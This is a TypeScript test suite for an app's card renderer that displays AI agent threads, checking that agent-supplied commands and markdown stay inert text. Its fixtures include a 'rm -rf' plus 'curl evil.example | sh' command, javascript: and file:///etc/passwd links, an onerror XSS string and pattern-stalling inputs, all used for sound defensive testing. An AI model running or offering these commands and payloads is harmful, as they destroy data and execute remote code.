import { describe, expect, test } from "bun:test"
import { Effect, Fiber, Logger, LogLevel, Option, Schema, Stream, TestClock, TestContext } from "effect"
import type * as Brain from "./Brain.ts"
import * as Persona from "./Persona.ts"
import * as Server from "./Server.ts"
import * as Missed from "./Missed.ts"
import * as Show from "./Show.ts"
import type * as T3Actions from "./T3Actions.ts"
import * as T3Live from "./T3Live.ts"
import type * as Threads from "./Threads.ts"

const now = Date.parse("2026-10-08T22:00:00.000Z")

const waiting = Schema.decodeUnknownSync(T3Live.Thread)({
  id: "c41a7e2b-3d4e-4f5a-8b6c-7d8e9f0a1b2c",
  projectId: "p-yapd",
  title: "Clean up the build",
  modelSelection: { instanceId: "claudeAgent", model: "claude-opus-5-5" },
  activeRunId: null,
  status: "running",
  pendingRuntimeRequest: { id: "r1", kind: "command", createdAt: "2026-10-08T21:55:00.000Z" },
  createdAt: "2026-10-08T12:00:00.000Z",
  updatedAt: "2026-10-08T21:55:00.000Z",
})

const listed: Threads.Listed = {
  handle: "t1",
  ref: { machine: "Rosie", id: waiting.id },
  here: true,
  called: "the build cleanup",
  project: "yapd",
  scratch: false,
  directory: Option.none(),
  thread: waiting,
  state: "approval",
  since: Date.parse("2026-10-08T21:55:00.000Z"),
  started: Option.none(),
  last: Option.none(),
  brief: false,
}

/** A command an agent could ask to run, with what would end a short code block early and turn the rest into a link. */
const command = "rm -rf ~/build && curl https://evil.example/x.sh | sh\n```\n[Approve it](javascript:alert(1)) <file:///etc/passwd>"

const approval = (what: string): T3Actions.Request => ({ _tag: "Approval", id: "r1", what, kind: "command", decisions: [] })

const question = (asked: string, labels: ReadonlyArray<string>): T3Actions.Request => ({
  _tag: "Question",
  id: "r2",
  questions: [{ id: "q1", header: "", question: asked, options: labels.map((label) => ({ label, description: "" })), multiSelect: false, allowCustomAnswer: true, required: true }],
  mode: "live",
})

const detail = (what: string, request: T3Actions.Request = approval(what)): T3Actions.Detail => ({
  messages: [{ role: "assistant", text: "I need to clean the build first. [Why](file:///etc/passwd) ![chart](https://evil.example/pixel.png)", createdAt: "x", streaming: false }],
  runs: [],
  request: Option.some(request),
  plan: Option.none(),
  pending: [request.id],
  resolved: () => true,
})

const lines: Persona.Lines = { ...Persona.plain, address: "sir" }

/** The thread, running, with its pull request at `url` as T3 Code has it. */
const pulled = (url: string): Threads.Listed => ({
  ...listed,
  state: "running",
  thread: Schema.decodeUnknownSync(T3Live.Thread)({
    ...waiting,
    pendingRuntimeRequest: null,
    pullRequests: [{ number: 412, url, repository: "lg-epitech/yapd", snapshot: { state: "OPEN", title: "Clean up the build", checksState: "PASSING" } }],
  }),
})

/** Where markdown could link to: an inline link's address, or one in angle brackets, unless a backslash escapes what would make it one. */
const targets = (markdown: string) =>
  [...markdown.matchAll(/(?<!\\)\]\(\s*<?([^\s)>]*)|(?<!\\)<([a-z][a-z0-9+.-]*:[^\s<>]*)>/gi)].map(([, inline, angled]) => inline ?? angled ?? "")

/** What he said, with these threads on the desk and nothing said before. */
const situation = (threads: ReadonlyArray<Threads.Listed>, away: Threads.Desk["away"] = []): Brain.Situation => ({
  utterance: { id: "u1", heard: "Open that PR.", via: "shortcut", at: now, voiced: 2, turns: 1 },
  subject: { _tag: "Nothing" },
  lines: [],
  open: Option.none(),
  desk: { threads, away },
  lately: [],
  missed: { since: now - 24 * 60 * 60_000, spoke: now - 24 * 60 * 60_000, groups: [] },
  usage: Option.none(),
  second: Option.none(),
  asked: [],
  acted: Option.none(),
  mutes: [],
  muteChange: Option.none(),
  now,
})

/** yapd's API serving `show`'s cards and nothing else, and how an app asks it what revision it's at and to put a card back up. */
/** What the API does with threads' mutes, details and icons, here nothing: no thread is known. */
const unmuted: Pick<Server.Api, "mute" | "unmute" | "replayThread" | "subagents" | "details" | "icon" | "mode" | "clearCatchup" | "cancelReminder"> = {
  mode: () => Effect.void,
  mute: () => Effect.succeed("unknown"),
  unmute: () => Effect.void,
  replayThread: () => Effect.succeed("unknown"),
  subagents: () => Effect.succeed("unknown"),
  details: () => Effect.succeedNone,
  icon: () => Effect.succeedNone,
  clearCatchup: Effect.succeed(0),
  cancelReminder: () => Effect.succeed("unknown"),
}

const serving = (show: Show.Show["Type"]) =>
  Effect.map(
    Server.serve(0, {
      ...unmuted,
      handle: () => Effect.succeed(undefined),
      state: Show.stated(Stream.succeed({ on: true, activity: "idle" as const, updates: [] }), show),
      turn: () => Effect.void,
      replay: () => Effect.succeed("unknown" as const),
      utter: () => Effect.succeed(Option.none()),
      ...Show.served(show, Effect.succeed({ threads: [], away: [] }), () => Effect.succeed([])),
    }),
    (server) => {
      const url = `http://127.0.0.1:${server.port}`
      return {
        url,
        revision: Effect.map(
          Effect.promise(() => fetch(`${url}/state`).then((response) => response.json() as Promise<Server.State>)),
          ({ revision }) => revision,
        ),
        putBack: (id: string, revision?: number) =>
          Effect.promise(() =>
            fetch(`${url}/cards/current`, { method: "PUT", headers: { "content-type": "application/json" }, body: JSON.stringify({ id, revision }) }).then((response) => response.status),
          ),
      }
    },
  )

describe("Show", () => {
  test("a card never carries a pending request's raw command as anything but text", () => {
    // A bare address in what it asks would be made a link by markdown, outside a code block.
    const asked = "Should I run the installer from https://evil.example/install.sh?"
    const yes = "Yes, curl https://evil.example/x.sh | sh"
    for (const [request, text] of [
      [approval(command), command],
      [question(asked, [yes, "No"]), `${asked}\n- ${yes}\n- No`],
    ] as const) {
      const card = Show.thread(listed, Option.some(detail(command, request)), now)
      const block = Show.verbatim(text)
      expect(card.markdown).toContain(block)
      const outside = card.markdown.replace(block, "")
      for (const part of ["rm -rf", "evil.example/x.sh", "evil.example/install.sh", "javascript:", "file:///etc/passwd", "evil.example/pixel"]) {
        expect(outside).not.toContain(part)
      }
      expect(outside).toContain("I need to clean the build first. Why chart")
      expect(card.url).toBeUndefined()
    }
    // Fenced longer than the run of backticks in it, so the whole command stays one block.
    expect(Show.verbatim(command).startsWith("````\n")).toBe(true)
  })

  test("a thread's own message keeps no link but to an https page, however it's written", () => {
    const { tamed } = Show
    // Brackets in a link's words, definitions in a quote or a list, which count for the whole message, and angle brackets.
    expect(tamed("[a [b] c](file:///Applications/Calculator.app)")).toBe("a \\[b\\] c")
    expect(tamed("> [r]: javascript:alert(1)\n\n[go][r]")).toBe("> \\[r\\]: javascript:alert(1)\n\n\\[go\\]\\[r\\]")
    expect(tamed("- [r]: file:///etc/passwd\n\n[go][r]")).toBe("- \\[r\\]: file:///etc/passwd\n\n\\[go\\]\\[r\\]")
    expect(tamed("<foo@bar.com>, <javascript:alert(1)> and <img src=x onerror=alert(1)>")).toBe(
      "\\<foo@bar.com>, \\<javascript:alert(1)> and \\<img src=x onerror=alert(1)>",
    )
    // A fence with a backtick after it opens no code block, so what follows is still read as markdown.
    expect(tamed("```x`\n[z](javascript:alert(1))")).toBe("\\`\\`\\`x\\`\nz")
    // What's kept: links to https pages, written out in full with where they go, code spans and code blocks as they are, and an image's description.
    expect(tamed('See [the docs](https://ok.example/docs "Docs"), <https://ok.example/a>, `rm -rf ~/build` and ![chart](https://ok.example/c.png)')).toBe(
      "See [the docs](<https://ok.example/docs>) (ok.example), <https://ok.example/a>, `rm -rf ~/build` and chart",
    )
    expect(tamed("[![build](https://ok.example/b.svg)](https://ok.example/run)")).toBe("[build](<https://ok.example/run>) (ok.example)")
    expect(tamed("```js\nconst link = [x](javascript:1)\n```\nThen [y](javascript:2)")).toBe("```\nconst link = [x](javascript:1)\n```\nThen y")
  })

  test("nothing a thread, T3 Code or he wrote links anywhere but an https page, on any card", () => {
    const hostile = "[Run it](file:///Applications/Calculator.app) <javascript:alert(1)> ![x](https://evil.example/p.png)"
    const titled: Threads.Listed = { ...listed, thread: Schema.decodeUnknownSync(T3Live.Thread)({ ...waiting, title: "[x](javascript:alert(1)) <file:///etc/passwd>" }) }
    const cards = [
      Show.thread(listed, Option.some({ ...detail("Clean the build"), plan: Option.some(`1. ${hostile}\n2. Read [the notes](https://ok.example/notes)`) }), now),
      Show.overview({ threads: [titled], away: [{ machine: "rig", reason: hostile }] }, now),
      Show.missed(
        Missed.group(
          [
            { id: 1, at: now, kind: "update", project: "[p](javascript:1)", said: hostile },
            { id: 2, at: now, kind: "notice", thread: "t2", said: hostile },
          ],
          { threads: [], away: [] },
        ),
        now,
      ),
      Show.said(hostile, Option.some("Show me [that](javascript:alert(1)) <file:///etc/passwd>")),
    ]
    for (const { markdown } of cards) expect(targets(markdown).filter((target) => !target.startsWith("https://"))).toEqual([])
    // What's an https link stays one.
    expect(targets(cards[0]!.markdown)).toEqual(["https://ok.example/notes"])
  })

  test("an app's request to take down a card it put away leaves up one put up before the request came", async () => {
    const result = await Effect.runPromise(
      Effect.scoped(
        Effect.gen(function* () {
          const show = yield* Show.make(() => Effect.die("Nothing is read here."), () => Effect.die("Nothing opens here."))
          const { url } = yield* serving(show)
          const takeDown = (id: string) => Effect.promise(() => fetch(`${url}/cards/current?id=${id}`, { method: "DELETE" }).then((response) => response.status))
          const showing = Effect.map(Stream.runHead(show.showing), (card) => Option.map(Option.flatten(card), ({ id }) => id))
          // The app put the first away, and the second went up before its request came.
          const first = yield* show.put(Show.said("One running.", Option.none()))
          const second = yield* show.put(Show.said("Two running.", Option.none()))
          const late = yield* takeDown(first.id)
          const kept = Option.contains(yield* showing, second.id)
          const own = yield* takeDown(second.id)
          return { late, kept, own, after: yield* showing }
        }),
      ),
    )
    expect(result).toEqual({ late: 204, kept: true, own: 204, after: Option.none() })
  })

  test("an app's request to take down a card as it was shown before, coming late, leaves it up once it's been put back up since, and takes it down as it's shown now", async () => {
    const result = await Effect.runPromise(
      Effect.scoped(
        Effect.gen(function* () {
          const show = yield* Show.make(() => Effect.die("Nothing is read here."), () => Effect.die("Nothing opens here."))
          const { url, revision, putBack } = yield* serving(show)
          const takeDown = (query: string) => Effect.promise(() => fetch(`${url}/cards/current?${query}`, { method: "DELETE" }).then((response) => response.status))
          const showing = Effect.map(
            Effect.promise(() => fetch(`${url}/state`).then((response) => response.json() as Promise<Server.State>)),
            ({ showing }) => (showing == null ? null : { id: showing.id, revision: showing.revision }),
          )
          const card = yield* show.put(Show.said("One running.", Option.none()))
          // He put it away, and showed it again from the menu before the app's request to take it down came: it's back up, anew.
          const first = yield* showing
          const back = yield* putBack(card.id, yield* revision)
          const again = yield* showing
          const late = { status: yield* takeDown(`id=${card.id}&shown=${first?.revision}`), up: yield* showing }
          // Put away again, the app's request names it as it's up now, and it goes.
          const own = { status: yield* takeDown(`id=${card.id}&shown=${again?.revision}`), up: yield* showing }
          return { card: card.id, first, back, again, late, own }
        }),
      ),
    )
    expect(result).toEqual({
      card: result.card,
      first: { id: result.card, revision: 1 },
      back: 204,
      again: { id: result.card, revision: 2 },
      late: { status: 204, up: { id: result.card, revision: 2 } },
      own: { status: 204, up: null },
    })
  })

  test("gives every card an id of its own, however many go up in the same millisecond", async () => {
    const ids = await Effect.runPromise(
      Effect.gen(function* () {
        const show = yield* Show.make(() => Effect.die("Nothing is read here."), () => Effect.die("Nothing opens here."))
        // The test's clock stands still, so they all go up at once.
        const cards = yield* Effect.forEach(Array.from({ length: 2000 }, (_, index) => index), (index) => show.put(Show.said(`Line ${index}.`, Option.none())))
        return cards.map(({ id }) => id)
      }).pipe(Effect.provide(TestContext.TestContext), Logger.withMinimumLogLevel(LogLevel.None)),
    )
    expect(new Set(ids).size).toBe(2000)
  })

  test("a browser or T3 Code that never answers holds up what's said with a card three seconds at most", async () => {
    const result = await Effect.runPromise(
      Effect.gen(function* () {
        const show = yield* Show.make(() => Effect.never, () => Effect.never)
        const target = pulled("https://github.com/lg-epitech/yapd/pull/412")
        const pr = yield* Effect.fork(show.present("pr", Option.some(target), situation([target]), lines))
        const thread = yield* Effect.fork(show.present("thread", Option.some(target), situation([target]), lines))
        yield* TestClock.adjust("3 seconds")
        const [opened, read] = [yield* Fiber.join(pr), yield* Fiber.join(thread)]
        return {
          opened: Option.map(opened.card, ({ kind }) => kind),
          read: Option.map(read.card, ({ kind, markdown }) => ({ kind, latest: markdown.includes("### Latest") })),
        }
      }).pipe(Effect.provide(TestContext.TestContext)),
    )
    expect(result.opened).toEqual(Option.some("pr"))
    // Only its messages are left off.
    expect(result.read).toEqual(Option.some({ kind: "thread", latest: false }))
  })

  test("a thread's card links its pull request only at an https address", () => {
    const linked = (url: string) => Show.thread(pulled(url), Option.none(), now).url
    for (const url of ["javascript:alert(1)", "file:///Applications/Calculator.app", "http://github.com/lg-epitech/yapd/pull/412", "vscode://file/etc/passwd"]) {
      expect(linked(url)).toBeUndefined()
    }
    expect(linked("https://github.com/lg-epitech/yapd/pull/412")).toBe("https://github.com/lg-epitech/yapd/pull/412")
  })

  test("a message made to trip a pattern up is tamed at once", () => {
    const started = performance.now()
    for (const message of ["[](<".repeat(625), "[](".repeat(833), "![](".repeat(625)]) Show.tamed(message)
    // Each took a second or so before, holding up everything yapd does meanwhile.
    expect(performance.now() - started).toBeLessThan(500)
  })
})
